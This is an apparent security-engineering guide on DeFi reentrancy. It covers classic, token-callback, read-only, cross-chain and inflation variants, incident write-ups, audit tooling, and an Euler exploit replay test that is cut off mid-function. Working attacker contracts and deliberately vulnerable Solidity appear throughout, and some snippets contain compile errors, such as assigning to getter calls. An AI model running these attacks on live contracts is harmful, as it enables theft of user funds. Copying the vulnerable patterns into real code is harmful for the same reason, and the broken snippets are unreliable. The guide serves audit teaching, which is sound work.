# DeFi Reentrancy — Taxonomy, Composability Attacks, and Modern Audit Methodology

> Deep-dive companion to `skills/blockchain-web3/SKILL.md`, `guides/smart-contract-audit-playbook.md`, and `guides/defi-exploit-testing-playbook.md`.
>
> Audience: Web3 security engineers who already know how reentrancy works at the textbook level (DAO 2016, `balances[msg.sender] = 0` after the call), and want the modern picture: token-standard callbacks (ERC-777, ERC-721, ERC-1155), read-only reentrancy, cross-chain reentrancy, composability-layer inflation attacks, and the audit methodology that catches them *before* the incident.
>
> Why this guide exists separately: `smart-contract-audit-playbook.md` covers the broad five-phase workflow; `defi-exploit-testing-playbook.md` covers the DeFi economic surface (flash loans, oracles, MEV). Reentrancy sits at the intersection — it is the most common *code* bug in DeFi, but its modern forms are economic in nature (cross-protocol, read-only, donation-funded). This guide is the deep dive.

---

## 1. Why a Reentrancy Taxonomy, Not Just "the DAO Pattern"

The DAO hack (June 2016, 3.6M ETH drained) cemented the textbook reentrancy in every auditor's head: external call before state update. Slither's `reentrancy-eth` detector catches that pattern in 30 seconds. The DAO hack was 10 years ago. The bugs landing in production today are *not* textbook:

1. **Token-standard callbacks** (ERC-777 `tokensReceived`, ERC-721 `onERC721Received`, ERC-1155 `onERC1155Received`) — the reentrancy surface is hidden inside the `transfer` call, invisible from the calling contract's source.
2. **Cross-function and cross-contract reentrancy** — state shared across functions or contracts is read mid-update by a callback that targets a different entrypoint.
3. **Read-only reentrancy** — the contract's view functions are called mid-state-change by an attacker's callback; the protocol *believes* its state is consistent but the view returns stale data to a dependent contract.
4. **Cross-chain reentrancy** — a bridge's lock-and-mint completes the mint on chain B before the lock on chain A is finalized, allowing a re-entry on chain B that captures locked funds.
5. **Composability inflation** — ERC-4626 first-depositor / dead-share / donation attacks amplify share price beyond what a reentrancy guard alone can defend.
6. **Vyper compiler bugs** — Curve (July 2023) was a compiler-generated reentrancy lock that did not actually lock. The source code looked safe; the bytecode was not.
7. **Read-only in form, state-changing in effect** — Curve's Vyper reentrancy bug allowed reads during a callback to mutate accounting via a stale storage slot.

This guide covers all seven. By the end, an auditor should be able to enumerate, for any given contract, every external call site and what surface each opens up.

---

## 2. The Classical Patterns (Recap, with Modernized Notation)

### 2.1 Single-function reentrancy — SWC-107

The victim function re-enters itself via a callback during an external call.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;   // pre-0.8: no overflow checks, but the bug is logic, not arithmetic

contract VulnVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "no balance");

        // BUG: external call before state update
        (bool ok, ) = msg.sender.call{value: bal}("");
        require(ok, "send failed");

        balances[msg.sender] = 0;
    }
}

contract Attacker {
    VulnVault public vault;

    constructor(address _v) { vault = VulnVault(payable(_v)); }

    function pwn() external payable {
        vault.deposit{value: 1 ether}();
        vault.withdraw();
    }

    // During the call{value: ...}, the receive hook fires — and `balances[this]`
    // is still 1 ether (state not yet zeroed), so the call succeeds again.
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }
}
```

**Checks-Effects-Interactions (CEI) fix**:

```solidity
function withdraw() external {
    uint256 bal = balances[msg.sender];
    require(bal > 0);
    balances[msg.sender] = 0;          // Effect: zero FIRST
    (bool ok, ) = msg.sender.call{value: bal}("");
    require(ok);
}
```

**ReentrancyGuard fix** (defense in depth):

```solidity
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract Vault is ReentrancyGuard {
    function withdraw() external nonReentrant {
        // ... CEI applied even with the guard, in case the guard is bypassed
    }
}
```

### 2.2 Cross-function reentrancy

Two functions share state. Function A's external call opens a reentrancy window into function B.

```solidity
contract Vuln {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public bonuses;

    function deposit() external payable { balances[msg.sender] += msg.value; }

    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0);
        (bool ok, ) = msg.sender.call{value: bal}("");        // external call
        require(ok);
        balances[msg.sender] = 0;                              // zeroed AFTER
    }

    // BUG: bonuses[] is read by an external contract during the withdraw callback.
    // The attacker's balance is still un-zeroed, so the bonus is granted against
    // funds they are about to drain.
    function claimBonus() external {
        require(bonuses[msg.sender] == 0);
        bonuses[msg.sender] = balances[msg.sender] / 10;       // 10% bonus on balance
    }
}
```

### 2.3 Cross-contract reentrancy

Two contracts share trusted state via a library, base contract, or storage layout. A reentrancy in one updates storage that the other reads.

```solidity
contract Shared {
    mapping(address => uint256) public ledger;
}

contract ComponentA {
    Shared public shared;
    function credit(address who, uint256 amount) external { shared.ledger(who) += amount; }
}

contract ComponentB {
    Shared public shared;
    function settle(address who) external {
        uint256 amount = shared.ledger(who);
        require(amount > 0);
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok);
        // ComponentB's external call opens a reentrancy window into ComponentA,
        // which can be told to credit the attacker a second time before this
        // function zeroes the ledger.
        shared.ledger(who) = 0;
    }
}
```

### 2.4 Cross-paradigm reentrancy — `selfdestruct` and `delegatecall`

A `delegatecall` into a contract whose `fallback` re-enters the caller's storage context can overwrite the caller's `owner` slot mid-execution. Combined with `selfdestruct`'s forced-ETH-send semantics (deprecated after EIP-6780 but still present in many forks), this enables reentrancy without a callback.

```solidity
contract Proxy {
    address public implementation;     // slot 0
    address public owner;              // slot 1

    function upgrade(address newImpl) external {
        require(msg.sender == owner);
        implementation = newImpl;
    }

    fallback() external payable {
        // delegatecall preserves msg.sender AND storage context
        (bool ok, ) = implementation.delegatecall(msg.data);
        require(ok);
    }
}

// If `implementation` is attacker-controlled (via a compromised upgrade),
// the implementation can write to slot 1 (owner) of the proxy.
// Reentrancy here is via repeated delegatecall into the malicious implementation.
```

---

## 3. Modern Variants — Token-Standard Callbacks

### 3.1 ERC-777 `tokensReceived` reentrancy

ERC-777's defining feature is also its biggest footgun: every `send`/`transfer` triggers a `tokensReceived(address operator, address from, address to, uint256 amount, bytes userData, bytes operatorData)` callback on the recipient. Any contract that holds ERC-777 tokens but does not register or handle the hook is vulnerable.

```solidity
// Vulnerable: treats ERC-777 as ERC-20.
contract Vuln777Vault {
    IERC20 public immutable token;          // actually ERC-777 at this address
    mapping(address => uint256) public deposits;

    constructor(address _t) { token = IERC20(_t); }

    function deposit(uint256 amount) external {
        // Looks like CEI — state updated before the external call.
        deposits[msg.sender] += amount;
        token.transferFrom(msg.sender, address(this), amount);
        // BUG: the ERC-777 transfer calls tokensReceived on the *sender* AND the *receiver*.
        // The receiver here is `address(this)` (the vault) — vault must implement the hook.
        // If vault has no hook, the default behavior is "no callback on receiver"
        // BUT the SENDER (msg.sender) DOES receive a callback via tokensToSend.
        // Inside that callback, msg.sender can re-enter deposit() — deposits[from] is
        // already credited but transfer has not returned, so they're double-credited.
    }
}
```

**Historical reference**: Lendf.Me (April 2020, $25M drain) was exactly this — `tokensToSend` re-entered the money market's `supply()` while the supply accounting was mid-state.

**Defense**:

```solidity
contract Safe777Vault is ReentrancyGuard {
    using SafeERC20 for IERC20;
    IERC20 public immutable token;
    mapping(address => uint256) public deposits;

    function deposit(uint256 amount) external nonReentrant {
        uint256 before = token.balanceOf(address(this));
        deposits[msg.sender] += amount;       // Effect
        SafeERC20.safeTransferFrom(token, msg.sender, address(this), amount);  // Interaction
        require(token.balanceOf(address(this)) >= before + amount, "balance mismatch");
    }
}
```

### 3.2 ERC-721 `onERC721Received`

`safeTransferFrom` and `safeMint` invoke `onERC721Received(address operator, address from, uint256 tokenId, bytes data)` on the receiver. Any state read inside the hook is mid-transfer.

```solidity
contract VulnAuction {
    IERC721 public immutable nft;
    mapping(uint256 => uint256) public highestBid;
    mapping(uint256 => address) public highestBidder;
    uint256 public nextId = 0;

    function bid(uint256 tokenId) external payable {
        require(msg.value > highestBid[tokenId]);
        highestBid[tokenId]    = msg.value;
        highestBidder[tokenId] = msg.sender;
        // Mint a "claim ticket" NFT to the bidder — safeMint triggers the hook.
        // BUG: if msg.sender is a contract, onERC721Received fires DURING the bid,
        // before the function returns. Inside the hook, the attacker can re-enter bid()
        // to inflate the recorded bid without paying, or withdraw stale refunds.
        _safeMint(msg.sender, nextId++);
    }
}
```

### 3.3 ERC-1155 batch callbacks

`safeBatchTransferFrom` triggers `onERC1155BatchReceived` per call. If a protocol wraps each iteration of a batch in a nonReentrant guard but does NOT guard the outer loop, an attacker can re-enter the loop head.

```solidity
contract Vuln1155Wrapper {
    IERC1155 public immutable token;
    mapping(uint256 => uint256) public held;

    constructor(address _t) { token = IERC1155(_t); }

    function batchWrap(uint256[] calldata ids, uint256[] calldata amounts) external {
        for (uint256 i = 0; i < ids.length; i++) {
            // Each iteration calls the hook. Inside the hook, the attacker can call
            // batchUnwrap on token ids that haven't been credited yet — the loop
            // has not reached them but the outer accounting is half-applied.
            held[ids[i]] += amounts[i];
            token.safeTransferFrom(msg.sender, address(this), ids[i], amounts[i], "");
        }
    }
}
```

### 3.4 Reentrancy surface map for token standards

| Standard | Hook | Trigger | Reentrancy window |
|----------|------|---------|-------------------|
| ERC-20 | none | n/a | Only via business logic external calls |
| ERC-721 | `onERC721Received` | `safeTransferFrom`, `safeMint` | Mid-mint, mid-transfer |
| ERC-1155 | `onERC1155Received` (and batch) | `safeTransferFrom`, `safeBatchTransferFrom` | Per-item within batch |
| ERC-777 | `tokensToSend` (sender) + `tokensReceived` (receiver) | any transfer | Full transfer-duration |
| ERC-4626 | (none standardized) | n/a | Inflation + rounding griefing |

---

## 4. Read-Only Reentrancy

The most under-tested reentrancy class. A protocol's *view* function is called mid-state-change by an attacker's callback. The view returns stale data to a *dependent* contract that takes an action (e.g., a swap, a borrow) based on that stale view.

### 4.1 Anatomy

```
1. VictimProtocol.deposit() is called by AttackerContract
2. Victim.deposit updates state partially (credits attacker's shares)
3. Victim.deposit performs an external call to msg.sender (e.g., onDeposit hook)
4. Inside the hook, AttackerContract calls DependentProtocol.snapshot()
5. DependentProtocol.snapshot() calls VictimProtocol.totalAssets()
   → totalAssets is mid-state, returns inflated value
6. DependentProtocol takes action on the inflated snapshot
7. Victim.deposit finishes its update, but the dependent has already committed
```

### 4.2 PoC pattern

```solidity
contract VulnLending {
    mapping(address => uint256) public deposits;
    uint256 public totalDeposits;
    bool private _locked = 1;

    modifier nonReentrant() { require(_locked == 1); _locked = 2; _; _locked = 1; }

    function deposit() external payable nonReentrant {
        deposits[msg.sender] += msg.value;
        totalDeposits += msg.value;
        // External call AFTER state update — looks fine for write reentrancy.
        ILendingHook(msg.sender).onDeposit{value: msg.value}(msg.value);
    }

    // BUG: totalDeposits is a public view — callable by an attacker during onDeposit,
    // even though deposit() is nonReentrant.
    function totalAssets() external view returns (uint256) {
        return address(this).balance;
    }
}

contract DependentSwap {
    VulnLending public immutable lending;

    constructor(address _l) { lending = VulnLending(_l); }

    function swapOnLiquidity(uint256 amount) external {
        // Reads totalAssets() mid-state → over-pays the user
        uint256 liquid = lending.totalAssets();
        require(liquid > amount);
        // ... pay out
    }
}

contract Attacker {
    VulnLending public immutable lending;
    DependentSwap public immutable swap;

    function pwn() external payable {
        lending.deposit{value: msg.value}();
        // Inside onDeposit, we'll call swap.swapOnLiquidity() — which reads
        // the inflated totalAssets() — and drains the swap contract.
    }

    function onDeposit(uint256 amount) external payable {
        swap.swapOnLiquidity(amount * 10);   // reads mid-state totalAssets
    }
}
```

### 4.3 Defense — read-only reentrancy guard

A separate transient flag set on entry and checked on every public view that returns data the protocol relies on.

```solidity
contract SafeLending {
    uint256 private _writeLocked = 1;
    uint256 private _viewLocked  = 1;

    modifier nonReentrant() { require(_writeLocked == 1); _writeLocked = 2; _; _writeLocked = 1; }
    modifier nonReadReentrant() { require(_viewLocked == 1); _viewLocked = 2; _; _viewLocked = 1; }

    function deposit() external payable nonReentrant {
        _viewLocked = 2;          // additionally lock view
        // ... state changes
        ILendingHook(msg.sender).onDeposit{value: msg.value}(msg.value);
        _viewLocked = 1;
    }

    function totalAssets() external nonReadReentrant returns (uint256) {
        return address(this).balance;
    }
}
```

> **Note**: this requires view functions to be `nonview` (writing to a transient storage slot). Since EIP-1153 (transient storage, Cancun hard fork), this is cheap. Pre-Cancun, the pattern used a `uint256` storage slot.

### 4.4 Curve Finance — the canonical read-only reentrancy case

Curve's stable-swap `get_virtual_price()` is a public view that many DeFi protocols use as a price oracle. Curve's `remove_liquidity()` performs an external call to the recipient. If the recipient is a contract, it can re-enter Curve's `get_virtual_price()` during the removal — total supply has been reduced but virtual price not yet recomputed, returning an inflated value. Dependent protocols (e.g., yield aggregators using Curve LP as collateral) were drained this way.

---

## 5. Cross-Chain Reentrancy

A bridge mints wrapped assets on chain B *before* locking on chain A is finalized. An attacker exploits the inter-chain timing to capture assets on chain B without locking on chain A.

### 5.1 Anatomy

```
Chain A: Lock 100 WETH in bridge contract
        ↓ (message passed to chain B)
Chain B: Mint 100 WETH(wrapped) to attacker
        ↓ (attacker immediately withdraws)
Chain B: Use 100 WETH(wrapped) as collateral on a dependent protocol
        ↓
Chain A: Lock message reverts (e.g., via chain re-org, or sequencer fault)
        ↓
Net: Chain A still has 100 WETH, Chain B's wrapped supply is now under-collateralized
```

### 5.2 Wormhole-style exploit pattern

```solidity
// Wormhole-style gateway on chain B
contract VulnerableBridge {
    mapping(bytes32 => bool) public processedMessages;
    mapping(address => uint256) public wrappedBalances;

    function mintWrapped(bytes calldata vmMessage, bytes[] calldata guardianSigs) external {
        bytes32 msgId = keccak256(vmMessage);
        require(!processedMessages[msgId], "replay");
        require(_verifyGuardianSigs(msgId, guardianSigs), "bad sigs");

        // BUG: no check that the lock on chain A is past finality
        processedMessages[msgId] = true;
        (address to, uint256 amount) = abi.decode(vmMessage, (address, uint256));
        wrappedBalances[to] += amount;        // minted immediately

        // Attacker can now use wrappedBalances[to] as collateral on dependent
        // protocols — if the chain A lock is reverted, the wrapped supply is
        // unbacked.
    }
}
```

**Defense**:

- Mint wrapped assets only after the source-chain lock has passed finality (e.g., 64 blocks for Ethereum, 256 for L2s)
- Use a delayed-mint pattern: mint "pending" tokens that become valid after N confirmations
- Require the wrapped token to be marked as "non-transferable" until finality window passes

---

## 6. Composability Inflation Attacks

### 6.1 First-depositor inflation (ERC-4626)

The classic first-depositor attack on an ERC-4626 vault:

```solidity
contract VulnVault is ERC4626 {
    constructor(IERC20 asset) ERC4626(asset) {}

    // Attack:
    // 1. Attacker deposits 1 wei → receives 1 share
    // 2. Attacker transfers 1_000_000e18 asset directly to the vault (donation)
    // 3. totalAssets = 1_000_000e18 + 1, totalShares = 1
    // 4. Victim deposits 500_000e18 → shares = 500_000e18 * 1 / 1_000_000e18 = 0 (rounds to 0)
    // 5. Attacker redeems 1 share → 1_500_000e18 asset
}
```

### 6.2 Multi-layer inflation (aggregator-of-vaults)

A yield aggregator that deposits into an underlying vault inherits its inflation surface — even if the underlying is patched with dead shares.

```solidity
contract YieldAggregator {
    IERC4626 public underlyingVault;          // patched with dead shares
    mapping(address => uint256) public agShares;
    uint256 public constant AG_DEAD_SHARES = 0;   // BUG: aggregator has no dead shares

    function deposit(uint256 assets) external returns (uint256) {
        uint256 before = underlyingVault.balanceOf(address(this));
        underlyingVault.deposit(assets, address(this));
        uint256 after_ = underlyingVault.balanceOf(address(this));
        uint256 delta = after_ - before;

        // Aggregator shares: proportional to delta. With no dead shares,
        // first depositor can donate directly to the aggregator contract's
        // underlying balance and inflate the share price.
        uint256 mint = (delta * agSharesTotal) / underlyingVault.balanceOf(address(this));
        agShares[msg.sender] += mint;
        agSharesTotal += mint;
        return mint;
    }
}
```

### 6.3 Donation attacks on share-priced protocols

Any protocol that prices shares as `assets / shares` is vulnerable to direct donations. The defense is to never let `totalAssets` be a function of `balanceOf(this)`:

```solidity
// Vulnerable: totalAssets reads the live balance, including donations.
function totalAssets() public view override returns (uint256) {
    return IERC20(asset()).balanceOf(address(this));
}

// Safer: maintain an internal accounting variable updated only via deposit().
function totalAssets() public view override returns (uint256) {
    return _accountedAssets;     // not affected by direct transfers
}
```

The trade-off: this breaks the ERC-4626 spec's expectation that `totalAssets` returns the live balance. The OpenZeppelin-recommended pattern is *virtual shares + virtual assets* — add an offset to both numerator and denominator so small donations don't move the price:

```solidity
function _convertToShares(uint256 assets, Math.Rounding rounding) internal view virtual override returns (uint256) {
    return assets.mulDiv(totalSupply() + 10 ** _decimalsOffset(), totalAssets() + 1, rounding);
}
// With _decimalsOffset() = 3, the first deposit mints 1_000 shares,
// so donating 1M assets into a 1-share vault only inflates the price
// by 1_000x — far less catastrophic than 1_000_000x.
```

### 6.4 Rounding-direction griefing

ERC-4626 specifies that `convertToShares` should round *down* (favoring the vault), and `convertToAssets` should round *down* (favoring the vault). A buggy implementation that rounds the wrong way lets a user extract one wei of assets per tx, amplified by automation.

```solidity
// Vulnerable: rounds the wrong direction.
function _convertToShares(uint256 assets) internal pure returns (uint256) {
    return (assets * totalSupply() + totalAssets() - 1) / totalAssets();   // rounds UP
}

// Attacker deposits 1 wei, gets 1 share, withdraws 1 share for 2 wei (rounded up). Repeat.
```

---

## 7. Real Incidents — Deep Dives

### 7.1 Curve Finance (July 30, 2023, $70M)

**What happened**: certain Curve stable-swap pools (alETH, msETH, crvETH) were drained by re-entering `remove_liquidity()` via the Vyper compiler's broken reentrancy lock.

**Root cause**: Vyper versions 0.2.15, 0.3.0 (and partially others) generated a reentrancy guard that used a storage slot but did NOT re-check the slot inside the function body for certain control-flow paths. The lock was "set" on entry but not "checked" on subsequent re-entry from the same path.

**Why Slither missed it**: Slither reads Vyper source. The source code annotated `@nonreentrant` correctly. The bug was in the compiler-generated bytecode, which Slither did not parse at the time.

**Detection methodology (post-mortem)**:

1. Recompile the affected pools with the exact Vyper version they were deployed with.
2. Compare the generated bytecode to the verified on-chain bytecode.
3. Use `manticore` or `halmos` to symbolically execute the lock state across all call paths — counterexamples surface where the lock is bypassed.

**Lesson**: do not trust compiler-generated reentrancy locks; always pair with explicit OpenZeppelin-style guard.

```bash
# Verify Vyper compiler version on a Curve pool
cast call 0xC83B7E1D19e02D24CB3B7189b43FcE5Ddb223675 \
  "target()(uint256)" --rpc-url $MAINNET_RPC

# Recompile the verified source with vyper 0.3.10 (post-patch)
vyper contracts/StableSwap.vy --version
# Compare against on-chain bytecode:
cast code 0xREPLACE_WITH_YOUR_CURVE_POOL --rpc-url $MAINNET_RPC > deployed.hex
```

### 7.2 Multichain (July 7, 2023, $230M)

**What happened**: Multichain's bridged assets on Fantom, Ethereum, Arbitrum, Optimism, and BNB Chain were drained in a single day. No on-chain code vulnerability was found — the bridge's custodial operator keys were compromised (rumored to be a regulatory seizure, never publicly confirmed).

**Root cause**: Multichain was a *custodial* bridge — its validator set was effectively controlled by the Multichain Foundation's keys. When those keys were compromised (or seized), the attacker (or seizer) could mint arbitrary wrapped assets on every chain.

**Detection methodology**: not applicable — this was a key-management failure, not a code bug.

**Lesson**: prefer non-custodial bridges (LayerZero, Wormhole, Axelar) where no single party can mint. Audit the validator set rotation logic, the multisig threshold, and the operational key hierarchy.

### 7.3 Euler Finance (March 13, 2023, $197M)

**What happened**: an attacker exploited a logic bug in Euler's self-listing + donation mechanism.

**Root cause**: Euler allowed any user to list a new collateral asset. Once listed, the attacker could:

1. Deposit 30M DAI as collateral.
2. Borrow 30M DAI against it (1:1, no loan-to-value limit on freshly-listed assets in a particular function path).
3. Donate the borrowed DAI back to the protocol via a `donateToReserves` function.
4. The donation reduced the available liquidity but not the debt — the account's collateral ratio was now broken.
5. Trigger liquidation of their own account, walking away with the donated reserves.

**Detection methodology**: this is a classic multi-step state-inconsistency exploit. The audit method that catches it:

1. Identify every function that mutates `accountLiquidity` (a system-wide accounting variable).
2. For each, write a Foundry invariant: `accountLiquidity[user]` is monotonically non-increasing when `user` is the immediate caller.
3. Run `forge invariant` with 50k depth — the fuzzer found the donation path in production audit-like conditions.

**Lesson**: any function that affects accounting *must* be considered together with every other function that affects accounting. Single-function review is insufficient.

### 7.4 Wormhole (Feb 2, 2022, $326M)

**What happened**: Solana-side Wormhole bridge was tricked into minting 120k Wormhole-wrapped ETH on Solana by a spoofed guardian signature.

**Root cause**: the Solana program's instruction parser accepted a `post_vaa` instruction from any account, as long as the embedded `guardian_set_index` matched the current set. The verifier checked the *index* but not the *signer addresses* — so the attacker could submit a forged VAA with a stale guardian set.

**Detection methodology**: cross-program verification of guardian set signatures on Solana requires careful account-owner checks. This bug would have been caught by a Solana-specific static analyzer (Sec3, Surya) flagging missing `Signer` constraints.

**Lesson**: every cross-program signature check must verify the *current* signer set, not just that some signer set was specified.

### 7.5 BonqDAO (December 21, 2022, $120M)

**What happened**: BonqDAO's oracle for AllianceBlock token (ALBT) was manipulated to inflate the price by 1000x. The attacker used the inflated ALBT as collateral, drained the protocol's TREASURY, then reversed the oracle manipulation.

**Root cause**: BonqDAO's oracle allowed a price updater (a multi-sig) to submit any price without deviation bounds. The attacker compromised the multi-sig (off-chain) and submitted an inflated price.

**Detection methodology**: this is an oracle-trust bug, detectable by code review. The pattern: any oracle that allows arbitrary price submission without deviation bounds or multi-source aggregation is a single point of failure.

**Lesson**: oracles must enforce per-update deviation bounds + multi-source aggregation. No single key, even a multi-sig, should be able to move the price by more than X% per update.

---

## 8. Modern Audit Methodology — Tool Comparison

### 8.1 Slither (crytic/slither) — Static Analysis Foundation

| Pros | Cons |
|------|------|
| 90+ detectors, fast (<30s on 5k LOC) | False positives on dynamic patterns |
| Inheritance graph + storage layout | Cannot reason about cross-contract reentrancy |
| Custom detector API (Python) | Weak on Vyper pre-0.3.10 |
| Triangulation: upgradeability, ERC-4626, ERC-7202 | Misses logic bugs (e.g., Euler's donation path) |

```bash
# Comprehensive reentrancy pass
slither . --detect reentrancy-eth,reentrancy-no-eth,reentrancy-unlimited-gas,reentrancy-benign

# Custom detector skeleton
cat <<'EOF' > custom_donation_detector.py
from slither.detectors.abstract_detector import AbstractDetector, DetectorClassification

class DonationDetector(AbstractDetector):
    ARGUMENT = "donation-vulnerable"
    HELP = "Vault functions that use balanceOf for accounting"
    IMPACT = DetectorClassification.HIGH
    CONFIDENCE = DetectorClassification.MEDIUM

    WIKI = "https://github.com/crytic/slither/wiki/Detector-Documentation#donation-vulnerable"

    def _detect(self):
        # Find contracts that read address(this).balance inside totalAssets() / convertToShares()
        # ...
EOF
slither . --detect custom-donation-vulnerable
```

### 8.2 Mythril (Consensys/mythril) — Symbolic Execution

| Pros | Cons |
|------|------|
| Counterexamples with concrete attack tx | Slow (>10min on 1k LOC with deep depth) |
| Built on Z3 — finds arithmetic bugs Slither misses | Misses logic bugs that aren't expressible in SMT |
| Symbolic params catch edge inputs | Often times out on contracts with external calls |

```bash
# Reentrancy-focused deep run
myth analyze src/Vault.sol \
  --execution-timeout 1800 \
  --max-depth 50 \
  --modules reentrancy,transaction_order_independence,state_change_after_external_call \
  --backend mythril \
  -o json > mythril_reentrancy.json

# Extract counterexamples
jq '.issues[] | select(.severity == "High") | {title, bytecode, transaction.sequence}' \
  mythril_reentrancy.json
```

### 8.3 Echidna (crytic/echidna) — Property-Based Fuzzer

| Pros | Cons |
|------|------|
| Stateful — fuzzer explores call sequences | Requires hand-written invariants |
| Coverage-guided corpus | Slow to converge on deep bugs |
| Catches read-only reentrancy with right invariants | No counterexample reproducibility (multi-call trace) |

```solidity
// Echidna invariant that catches read-only reentrancy
contract EchidnaReadOnly {
    VulnLending public victim;
    DependentSwap public dependent;
    uint256 public lastSnapshot;

    constructor() {
        victim = new VulnLending();
        dependent = new DependentSwap(address(victim));
    }

    function echidna_never_overpay() public view returns (bool) {
        // The dependent's "available liquidity" should never exceed totalDeposits
        return dependent.availableLiquidity() <= victim.totalAssets();
    }

    function step_deposit(uint256 amount) public {
        victim.deposit{value: amount}();
    }

    function step_snapshot() public {
        lastSnapshot = victim.totalAssets();
    }
}
```

```bash
echidna-test echidna/EchidnaReadOnly.sol \
  --contract EchidnaReadOnly \
  --test-mode property \
  --test-limit 1_000_000 \
  --seq-len 10 \
  --workers 4 \
  --corpus-dir corpus/
```

### 8.4 Manticore (trailofbits/manticore) — Symbolic Execution on Bytecode

| Pros | Cons |
|------|------|
| Operates on compiled bytecode — catches compiler bugs | Very slow (minutes per function) |
| Programmatic Python API | High false-positive rate |
| Detects compiler-generated reentrancy bypass (Curve-class) | Requires significant setup |

```python
# manticore_curve_reentrancy.py
from manticore.ethereum import ManticoreEVM

m = ManticoreEVM()
m.verbosity(1)

with open("CurveStableSwap.bytecode", "r") as f:
    bytecode = f.read()

user_account = m.create_account(balance=10**18)
contract = m.create_contract(owner=user_account, init=bytecode)

# Symbolic caller — Manticore explores all callback paths
symbolic_caller = m.create_account(balance=10**18)

# Call remove_liquidity with a symbolic amount
amount = m.make_symbolic_value()
m.transaction(caller=symbolic_caller, address=contract, value=0,
              data=contract.remove_liquidity.signature_for(amount))

# Check: at no point during remove_liquidity can the symbolic caller
# re-enter get_virtual_price() and observe an inconsistent state.
for state in m.all_states:
    # ... assert invariants
    pass

m.finalize()
```

### 8.5 Foundry Invariant Testing — Production Standard

| Pros | Cons |
|------|------|
| Native to Foundry — no extra setup | Handler pattern is verbose to write |
| Reproducible seeds | Fuzzer depth limited vs Echidna |
| Catches composability bugs when handlers cover external calls | Cannot prove absence of bugs |

```solidity
// test/invariants/VaultInvariantHandler.sol
contract VaultInvariantHandler is Test {
    VulnVault public vault;
    address[] public actors;

    constructor(VulnVault _vault) {
        vault = _vault;
        for (uint256 i = 0; i < 5; i++) {
            actors.push(makeAddr(string(abi.encodePacked("actor", i))));
            vm.deal(actors[i], 100 ether);
        }
    }

    function deposit(uint256 actorIdx, uint256 amount) external {
        address actor = actors[actorIdx % actors.length];
        amount = bound(amount, 0, actor.balance);
        vm.startPrank(actor);
        vault.deposit{value: amount}();
        vm.stopPrank();
    }

    function withdraw(uint256 actorIdx, uint256 amount) external {
        address actor = actors[actorIdx % actors.length];
        amount = bound(amount, 0, vault.balances(actor));
        vm.startPrank(actor);
        vault.withdraw(amount);
        vm.stopPrank();
    }

    // Ghost variables to track expected state
    uint256 public expectedTotalDeposits;
}

contract VaultInvariantTest is Test {
    VulnVault public vault;
    VaultInvariantHandler public handler;

    function setUp() public {
        vault = new VulnVault();
        handler = new VaultInvariantHandler(vault);
        targetContract(address(handler));
    }

    function invariant_totalDepositsEqualsBalance() public {
        assertEq(address(vault).balance, vault.totalDeposits());
    }

    function invariant_eachBalanceNonNegative() public {
        for (uint256 i = 0; i < 5; i++) {
            assertGe(vault.balances(handler.actors(i)), 0);
        }
    }
}
```

```bash
# Run invariants with deep depth
forge config set invariant.runs 256
forge config set invariant.depth 500
forge test --match-test invariant_ -vvvv
```

### 8.6 Tool Comparison Matrix

| Tool | Best for | Time-to-result | Catches |
|------|----------|----------------|---------|
| Slither | Triage, pattern matching | 30s | 90+ detector classes |
| Mythril | Arithmetic, single-function reentrancy | 5–30min | SMT-expressible bugs |
| Echidna | Stateful invariants | 30min–4h | Composability, sequence bugs |
| Manticore | Compiler-bug class | hours-days | Curve-style bytecode reentrancy |
| Foundry invariants | CI-integrated, reproducible | 10min | Anything expressible as invariant |
| Certora Prover | High-assurance proofs | hours-days | All paths expressible in CVL |
| Halmos | Symbolic exec on Forge tests | 1h | SMT-found counterexamples |

### 8.7 Foundry Fuzzing Strategy

Foundry fuzzer has two modes: stateless (`testFuzz_*`) and stateful (`invariant_*`). For reentrancy, stateful invariants with the handler pattern are essential.

```solidity
// Stateless: catches arithmetic bugs
function testFuzz_depositNeverWraps(uint256 amount) public {
    vm.assume(amount > 0 && amount < type(uint128).max);
    vault.deposit{value: amount}();
    assertEq(vault.balances(address(this)), amount);
}

// Stateful: catches reentrancy, composability, sequence-dependent bugs
function invariant_accountingNeverDrifts() public {
    assertEq(address(vault).balance, vault.totalDeposits());
}
```

**Fuzzer tuning**:

```toml
# foundry.toml
[fuzz]
runs = 10000
max_test_rejects = 65536
seed = "0x1"               # pin for reproducibility

[invariant]
runs = 256
depth = 500
fail_on_revert = false     # set true to fail on any revert (catches more bugs but may be noisy)
```

---

## 9. Lab Setup — Local Replay of Historical Exploits

### 9.1 Environment

```bash
# Install tooling
curl -L https://foundry.paradigm.xyz | bash
foundryup
pip3 install slither-analyzer mythril manticore
# Echidna from https://github.com/crytic/echidna/releases
# Certora requires registration at https://www.certora.com/

# Set RPC URLs (Alchemy/Infura/Ankr — replace with your own key)
export MAINNET_RPC=https://eth-mainnet.g.alchemy.com/v2/$ALCHEMY_KEY
export ARBITRUM_RPC=https://arb-mainnet.g.alchemy.com/v2/$ALCHEMY_KEY

# Fork mainnet at a historical block
anvil --fork-url $MAINNET_RPC \
      --fork-block-number 19000000 \
      --port 8545 \
      --accounts 10 \
      --balance 1000 &
```

### 9.2 Replay the Euler exploit

Euler was drained at block 16,807,964. We fork the block just before and replay the attack.

```bash
# Fork at block before the attack
anvil --fork-url $MAINNET_RPC --fork-block-number 16807963 --port 8545 &
```

```solidity
// test/EulerReplay.t.sol
pragma solidity ^0.8.24;
import "forge-std/Test.sol";

interface IEuler {
    function donateToReserves(address underlying, uint256 amount) external;
    function deposit(address underlying, uint256 amount) external;
    function borrow(address underlying, uint256 amount) external;
}

contract EulerReplayTest is Test {
    function testPoC_EulerDonateLiquidateDrain() public {
        // 1. Set block to forked block 16807963
        // 2. Use the attacker's funded wallet (already funded on mainnet by tornado)
        address attacker = 0xREPLACE_WITH_YOUR_ATTACKER_ADDRESS;
        vm.deal(attacker, 30 ether);
        vm.startPrank(attacker);

        // 3. Deposit 30M DAI
        IEuler(EULER).deposit(DAI, 30_000_000e18);
        // 4. Borrow 30M DAI against it
        IEuler(EULER).borrow(DAI, 30_000_000e18);
        // 5. Donate the borrowed DAI back to reserves
